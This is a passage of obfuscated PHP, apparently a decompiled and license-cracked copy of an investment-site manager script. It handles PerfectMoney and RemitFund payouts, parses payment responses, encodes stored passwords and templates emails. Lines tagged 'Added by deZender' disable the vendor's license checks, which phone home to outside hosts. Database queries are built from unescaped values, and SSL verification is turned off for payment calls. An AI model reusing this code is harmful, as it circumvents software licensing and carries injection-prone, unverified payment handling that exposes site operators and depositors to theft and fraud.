
      while (!$elnlcmzBks)
      {
        $elnlcOUVnh = trim (substr ($elnlcsgNvx, $elnlcfovQE + 15, $elnlclucM - 15));
        $elnlcAhkd = false;
        if ($elnlcDBNHB = stristr ($elnlcOUVnh, '<error>') === false)
        {
          $elnlcAhkd = true;
        }
        else
        {
          $elnlcimegf = strlen ($elnlcOUVnh) - strlen ($elnlcDBNHB);
        }

        if ($elnlcfpCJ = stristr ($elnlcOUVnh, '</error>') === false)
        {
          $elnlcAhkd = true;
        }
        else
        {
          $elnlcTsEcG = strlen ($elnlcOUVnh) - strlen ($elnlcfpCJ);
        }

        while (!$elnlcAhkd)
        {
          $elnlcjcEao = trim (substr ($elnlcOUVnh, $elnlcimegf + 7, $elnlcTsEcG - 7));
          $elnlcOUVnh = trim (substr ($elnlcOUVnh, $elnlcTsEcG + 8));
          $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlctaiie ($elnlcjcEao, 'text');
          $elnlcaMIz[$elnlcsyENS['elnlcJcklA']] = elnlctaiie ($elnlcjcEao, 'additional');
          if ($elnlcDBNHB = stristr ($elnlcOUVnh, '<error>') === false)
          {
            $elnlcAhkd = true;
          }
          else
          {
            $elnlcimegf = strlen ($elnlcOUVnh) - strlen ($elnlcDBNHB);
          }

          if ($elnlcfpCJ = stristr ($elnlcOUVnh, '</error>') === false)
          {
            $elnlcAhkd = true;
            continue;
          }
          else
          {
            $elnlcTsEcG = strlen ($elnlcOUVnh) - strlen ($elnlcfpCJ);
            continue;
          }
        }

        $elnlcsgNvx = trim (substr ($elnlcsgNvx, $elnlclucM + 16));
        if ($elnlccAkg = stristr ($elnlcsgNvx, '<errorresponse>') === false)
        {
          $elnlcmzBks = true;
        }
        else
        {
          $elnlcfovQE = strlen ($elnlcsgNvx) - strlen ($elnlccAkg);
        }

        if ($elnlcHVgA = stristr ($elnlcsgNvx, '</errorresponse>') === false)
        {
          $elnlcmzBks = true;
          continue;
        }
        else
        {
          $elnlclucM = strlen ($elnlcsgNvx) - strlen ($elnlcHVgA);
          continue;
        }
      }
    }

    return $elnlcaMIz;
  }

  function elnlcqvge ($elnlcoFEhc, $elnlckrbA)
  {
    global $elnlcsyENS;
    $elnlcdFlcU = strlen ($elnlckrbA) + 2;
    $elnlcmqta = strpos ($elnlcoFEhc, '' . '<' . $elnlckrbA . ' ');
    $elnlctFpf = strpos ($elnlcoFEhc, '' . '<' . $elnlckrbA . '>');
    if ($elnlcmqta !== false)
    {
      $elnlcfovQE = $elnlcmqta;
    }

    if ($elnlctFpf !== false)
    {
      $elnlcfovQE = $elnlctFpf;
    }

    if ($elnlcfovQE === false)
    {
      return '';
    }

    if ($elnlclucM = strpos ($elnlcoFEhc, '' . '</' . $elnlckrbA . '>') === false)
    {
      return '';
    }

    $elnlcPihQx = strpos ($elnlcoFEhc, '>', $elnlcfovQE);
    $elnlcrkADN = trim (substr ($elnlcoFEhc, $elnlcPihQx + 1, $elnlclucM - ($elnlcfovQE + $elnlcdFlcU)));
    return $elnlcrkADN;
  }

  function elnlcwbil ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcJfxs = elnlcqvge ($elnlcpdllV, 'Receipt');
    if ($elnlcJfxs != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
      $elnlckbFm = $elnlcJfxs;
      $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlcqvge ($elnlckbFm, 'ReceiptId');
      $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlcqvge ($elnlckbFm, 'Payer');
      $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlcqvge ($elnlckbFm, 'Payee');
      $elnlcDUqPg = elnlcqvge ($elnlckbFm, 'Equivalent');
      $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlcqvge ($elnlcDUqPg, 'Amount');
      $elnlcaMIz[$elnlcsyENS['elnlccefl']] = elnlcqvge ($elnlcDUqPg, 'CurrencyId');
    }

    $elnlcsgNvx = elnlcqvge ($elnlcpdllV, 'ErrorResponse');
    if ($elnlcsgNvx != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
      $elnlcjcEao = $elnlcsgNvx;
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlcqvge ($elnlcjcEao, 'Text');
      $elnlcaMIz[$elnlcsyENS['elnlcJcklA']] = elnlcqvge ($elnlcjcEao, 'Additional');
    }

    return $elnlcaMIz;
  }

  function elnlcrqgmr ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcJfxs = elnlcqvge ($elnlcpdllV, 'Receipt');
    if ($elnlcJfxs != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
      $elnlckbFm = $elnlcJfxs;
      $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlcqvge ($elnlckbFm, 'ReceiptId');
      $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlcqvge ($elnlckbFm, 'Payer');
      $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlcqvge ($elnlckbFm, 'Payee');
      $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlcqvge ($elnlckbFm, 'Amount');
      $elnlcaMIz[$elnlcsyENS['elnlccefl']] = elnlcqvge ($elnlckbFm, 'CurrencyId');
    }

    $elnlcsgNvx = elnlcqvge ($elnlcpdllV, 'Balance');
    if ($elnlcsgNvx != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
      $elnlcjcEao = $elnlcsgNvx;
      $elnlcaMIz[$elnlcsyENS['elnlcpbpw']] = elnlcqvge ($elnlcjcEao, 'Value');
    }

    $elnlcsgNvx = elnlcqvge ($elnlcpdllV, 'Error');
    if ($elnlcsgNvx != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
      $elnlcjcEao = $elnlcsgNvx;
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlcqvge ($elnlcjcEao, 'Text');
      $elnlcaMIz[$elnlcsyENS['elnlcJcklA']] = elnlcqvge ($elnlcjcEao, 'Description');
    }

    return $elnlcaMIz;
  }

  function elnlcragde ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcJfxs = elnlcqvge ($elnlcpdllV, 'Status');
    if (elnlcqvge ($elnlcJfxs, 'Code') == $elnlcsyENS['elnlczqxW'])
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcfNibu'];
    }
    else
    {
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcHHvP'];
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlcqvge ($elnlcpdllV, 'Message');
    }

    $elnlcBmFIu = elnlcqvge ($elnlcpdllV, 'Balance');
    if ($elnlcBmFIu != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlcpbpw']] = $elnlcBmFIu;
    }

    $elnlcJfxs = elnlcqvge ($elnlcpdllV, 'Transfer');
    if ($elnlcJfxs != '')
    {
      $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlcqvge ($elnlcJfxs, 'Payer');
      $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlcqvge ($elnlcJfxs, 'Payee');
      $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlcqvge ($elnlcJfxs, 'Amount');
      $elnlcaMIz[$elnlcsyENS['elnlcHSjgu']] = elnlcqvge ($elnlcJfxs, 'Memo');
      $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlcqvge ($elnlcJfxs, 'Batch');
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlcqvge ($elnlcJfxs, 'Message');
    }

    return $elnlcaMIz;
  }

  function elnlcbvtd ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 18);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcgvuJ = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        list ($elnlcgvuJ, $elnlcTLfa) = preg_split ('/\\|/', $elnlcnOll);
        $elnlcSuVc[$elnlcsyENS['elnlcbNvAg']] = $elnlcTLfa;
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcJrCH']]) . '&PassPhrase=' . rawurlencode ($elnlcgvuJ) . '&Payer_Account=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcbNvAg']]) . '&Payee_Account=' . rawurlencode ($elnlcOPfeJ) . '&Amount=' . rawurlencode ($elnlcrUqv) . ('' . '&Memo=' . $elnlcgDnCo));
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcQSee = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcQSee))
      {
        return array (1, '', $elnlcQSee[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcQSee))
        {
          $elnlcuANCI = preg_replace ('/&lt;/i', '<', $elnlcQSee[1]);
          $elnlcuANCI = preg_replace ('/&gt;/i', '>', $elnlcuANCI);
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcuANCI);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ('' . ' ' . $elnlcuANCI), '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcknugv ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 25);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcHoqE = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $elnlcrmfU = $elnlcSuVc[$elnlcsyENS['elnlclVqd']];
      }
      else
      {
        list ($elnlcHoqE, $elnlcrmfU) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcOATM = strtoupper (md5 ('' . $elnlcrmfU . 'transferUSD' . $elnlcSuVc[$elnlcsyENS['elnlcPHDp']] . $elnlcOPfeJ . $elnlcrUqv . strtoupper (md5 ($elnlcHoqE))));
      $elnlcoFEhc = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcrmfU) . ('' . '</ApiName>
    <Token>' . $elnlcOATM . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcPHDp']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcoFEhc));
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $elnlcsUbby = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcEPBUz, CURLOPT_HTTPHEADER, $elnlcsUbby);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcaMIz = elnlcpgwrn ($a);
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
      {
        return array (1, '', $elnlcaMIz[$elnlcsyENS['elnlcwuPu']]);
      }
      else
      {
        if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcoJJM']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcpgwrn ($elnlcpdllV)
  {
    global $elnlcsyENS;
    $elnlcaMIz = array ();
    $elnlcJfxs = elnlcqvge ($elnlcpdllV, 'Response');
    if ($elnlcJfxs != '')
    {
      $elnlckbFm = $elnlcJfxs;
      $elnlcaMIz[$elnlcsyENS['elnlcdOdG']] = elnlcqvge ($elnlckbFm, 'Code');
      $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] = elnlcqvge ($elnlckbFm, 'Message');
      $elnlcaMIz[$elnlcsyENS['elnlccotiB']] = ($elnlcaMIz[$elnlcsyENS['elnlcdOdG']] == 0 ? 'ok' : 'error');
      $elnlcaMIz[$elnlcsyENS['elnlcwuPu']] = elnlcqvge ($elnlckbFm, 'TransferId');
      $elnlcaMIz[$elnlcsyENS['elnlcIbss']] = elnlcqvge ($elnlckbFm, 'Payer');
      $elnlcaMIz[$elnlcsyENS['elnlcANlw']] = elnlcqvge ($elnlckbFm, 'Payee');
      $elnlcaMIz[$elnlcsyENS['elnlcyteO']] = elnlcqvge ($elnlckbFm, 'Amount');
      $elnlcaMIz[$elnlcsyENS['elnlccefl']] = elnlcqvge ($elnlckbFm, 'Currency');
    }

    return $elnlcaMIz;
  }

  function elnlcfkhm ($elnlcECvOw, $a)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($a != 'RedControl 2010')
    {
      return elnlchhyo ($elnlcECvOw);
    }

    $elnlcnHzmn = base64_encode ($elnlcECvOw);
    $a = preg_split ('//', $elnlcnHzmn);
    $b = preg_split ('//', md5 ($elnlcECvOw) . base64_encode ($elnlcECvOw));
    $elnlcnHzmn = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcnHzmn = $elnlcnHzmn . $a[$i] . $b[$i];
    }

    $elnlcnHzmn = str_replace ('=', '!!!^', $elnlcnHzmn);
    return elnlcflii ($elnlcnHzmn, $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], $elnlcsyENS['elnlcWfUti']);
  }

  function elnlctiim ($elnlcECvOw, $a)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($a != 'RedControl 2010')
    {
      return elnlchhyo ($elnlcECvOw);
    }

    $elnlcECvOw = str_replace ('!!!^', '=', elnlcgglf ($elnlcECvOw, $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], 'RedControl 2010'));
    $a = preg_split ('//', $elnlcECvOw);
    $elnlcECvOw = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($a); $i += 2)
    {
      $elnlcECvOw .= $a[$i - 1];
    }

    $elnlcnHzmn = base64_decode ($elnlcECvOw);
    return $elnlcnHzmn;
  }

  function elnlchhyo ($elnlcECvOw)
  {
    global $elnlcsyENS;
    $elnlcnHzmn = base64_encode ($elnlcECvOw);
    $a = preg_split ('//', $elnlcnHzmn);
    $b = preg_split ('//', md5 ($elnlcECvOw) . base64_encode ($elnlcECvOw));
    $elnlcnHzmn = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($a); ++$i)
    {
      $elnlcnHzmn = $elnlcnHzmn . $a[$i] . $b[$i];
    }

    $elnlcnHzmn = str_replace ('=', '!!!^', $elnlcnHzmn);
    return $elnlcnHzmn;
  }

  function elnlczehcg ($elnlcECvOw)
  {
    global $elnlcsyENS;
    $elnlcECvOw = str_replace ('!!!^', '=', $elnlcECvOw);
    $a = preg_split ('//', $elnlcECvOw);
    $elnlcECvOw = '';
    for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($a); $i += 2)
    {
      $elnlcECvOw .= $a[$i - 1];
    }

    $elnlcnHzmn = base64_decode ($elnlcECvOw);
    return $elnlcnHzmn;
  }

  function elnlczmnt ()
  {
    global $elnlcsyENS;
    global $elnlcUAAU;
    global $elnlcSuVc;
return;	// Added by deZender, 2010.01.30
    $elnlcsCQn = ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 1 ? '64.27.18.142' : $elnlcsyENS['elnlchLry']);
    $elnlcNuUc = @fopen ($elnlcsyENS['elnlcbseH'] . $elnlcsCQn . '/check.cgi?domain=' . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . '&license=' . $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcNuUc)
    {
      fclose ($elnlcNuUc);
    }

  }

  function elnlcilyp ()
  {
    global $elnlcsyENS;
    global $elnlcUAAU;
    global $elnlcSuVc;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlcsyENS['elnlcmjUx'];
      while ($i < 2)
      {
        $elnlcEPBUz = curl_init ();
        if ($i == 1)
        {
          $elnlcsCQn = '64.27.18.142';
        }
        else
        {
          $elnlcsCQn = 'www.dnsargentina.com.ar';
        }

        $elnlcJxPsF = 'http://' . $elnlcsCQn . '/check.cgi?install=1&script=3&domain=' . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . '&license=' . $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcEPBUz, CURLOPT_URL, $elnlcJxPsF);
        curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcEPBUz);
        curl_close ($elnlcEPBUz);
        if ($l != '')
        {
          $i = $elnlcsyENS['elnlcbpKgI'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcNuUc = @fopen ($elnlcsyENS['elnlcwLGVj'] . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . '&license=' . $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcNuUc)
      {
        $l = fread ($elnlcNuUc, 200000);
        fclose ($elnlcNuUc);
      }
    }

    return $l;
  }

  function elnlcesyjp ()
  {
    global $elnlcsyENS;
  }

  function elnlcptwmv ($elnlcvuCiV)
  {
  /*-- Added by deZender, 2010.01.30: begin --*/
  	$str = $elnlcvuCiV;
    if (strpos($str, '{vm_time}') !== false)
    {
      $str = str_replace('{vm_time}', gmdate('YmdH'), $str);
      return $str;
    }
    elseif (strpos($str, '{px_time}') !== false)
    {
      $str = str_replace('{px_time}', gmdate('Ymd:H'), $str);
      return $str;
    }
  	elseif (strpos($str, '{lr_time}') !== false)
  	{
  		$str = str_replace('{lr_time}', gmdate('Ymd:H'), $str);
      require_once 'inc/sha256.class.php';
      return sha256::hash($str);
    }
    else
    {
      require_once 'inc/sha256.class.php';
      return sha256::hash($str);
    }
  	/*-- Added by deZender, 2010.01.30: end --*/
	
    global $elnlcsyENS;
    global $elnlcUAAU;
    global $elnlcSuVc;
    $elnlcEabU = base64_encode ($elnlcvuCiV);
    $elnlcEPBUz = curl_init ();
    $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
    if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 1)
    {
      $elnlcsCQn = '64.27.18.142';
    }
    else
    {
      if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 2)
      {
        $elnlcsCQn = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcsCQn = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'http://' . $elnlcsCQn . $elnlcsyENS['elnlcAhry']);
    curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
    curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcEabU . '&domain=' . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . '&s=p&license=' . $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']]);
    curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcEPBUz);
    curl_close ($elnlcEPBUz);
    return chop ($l);
  }

  function elnlcqsjub ($elnlcvuCiV, $elnlcpnExW = 0)
  {
    global $elnlcsyENS;
    global $elnlcUAAU;
    global $elnlcSuVc;
return;	// Added by deZender, 2010.01.30
    if ($elnlcpnExW == 1)
    {
      $elnlcEabU = substr (trim ($elnlcvuCiV), 0, 32);
    }
    else
    {
      $elnlcEabU = base64_encode (serialize ($elnlcvuCiV));
    }

    $elnlcEPBUz = curl_init ();
    $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
    if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 1)
    {
      $elnlcsCQn = '64.27.18.142';
    }
    else
    {
      if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 2)
      {
        $elnlcsCQn = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcsCQn = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'http://' . $elnlcsCQn . $elnlcsyENS['elnlcwrzip']);
    curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
    curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcEabU . '&mode=' . $elnlcpnExW . '&domain=' . $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] . '&s=p&license=' . $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']]);
    curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcEPBUz);
    curl_close ($elnlcEPBUz);
    if ($elnlcpnExW == 1)
    {
      $elnlcaMIz = array ();
      if ($l != 'nill')
      {
        $elnlcaMIz = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlcaMIz))
        {
          $elnlcaMIz = array ();
        }
      }

      return $elnlcaMIz;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcsius ($elnlcMHzHb, $elnlcVdPU, $elnlcQVmJ, $elnlcRuFoK)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlcMHzHb . '\'';
    $elnlchGkPU = mysql_query ($q);
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    if (!$elnlcCgqPK)
    {
      return null;
    }

    if (!$elnlcCgqPK[$elnlcsyENS['elnlccotiB']])
    {
      return null;
    }

    $elnlcLOyx = $elnlcCgqPK[$elnlcsyENS['elnlcoJJM']];
    $elnlcgBcp = $elnlcCgqPK[$elnlcsyENS['elnlcfBDgk']];
    $elnlciFbpa = $elnlcCgqPK[$elnlcsyENS['elnlcrWon']];
    foreach ($elnlcRuFoK as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcLOyx = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcLOyx);
      $elnlciFbpa = preg_replace ('' . '/#' . $k . '#/', $v, $elnlciFbpa);
      if ($elnlcCgqPK[$elnlcsyENS['elnlclURm']])
      {
        $elnlcgBcp = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcgBcp);
        continue;
      }
    }

    $elnlcLOyx = preg_replace ('/#site_name#/', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']], $elnlcLOyx);
    if ($elnlcCgqPK[$elnlcsyENS['elnlclURm']])
    {
      $elnlcgBcp = preg_replace ('/#site_name#/', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']], $elnlcgBcp);
    }

    $elnlciFbpa = preg_replace ('/#site_name#/', $elnlcSuVc[$elnlcsyENS['elnlcIEsb']], $elnlciFbpa);
    $elnlcLOyx = preg_replace ('/#site_url#/', $elnlcSuVc[$elnlcsyENS['elnlcRQss']], $elnlcLOyx);
    if ($elnlcCgqPK[$elnlcsyENS['elnlclURm']])
    {
      $elnlcgBcp = preg_replace ('/#site_url#/', $elnlcSuVc[$elnlcsyENS['elnlcRQss']], $elnlcgBcp);
    }

    $elnlciFbpa = preg_replace ('/#site_url#/', $elnlcSuVc[$elnlcsyENS['elnlcRQss']], $elnlciFbpa);
    if ($elnlcCgqPK[$elnlcsyENS['elnlclURm']])
    {
      $elnlcgxPK = elnlcpfqe (12);
      $elnlcLOyx = elnlcipca ($elnlcLOyx);
      $elnlcgBcp = elnlcgqup ($elnlcgBcp);
      $elnlcPoFxR = '' . '--' . $elnlcgxPK . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcLOyx . '

--' . $elnlcgxPK . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlcgBcp . '

--' . $elnlcgxPK . '--';
    }
    else
    {
      $elnlcPoFxR = $elnlcLOyx;
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
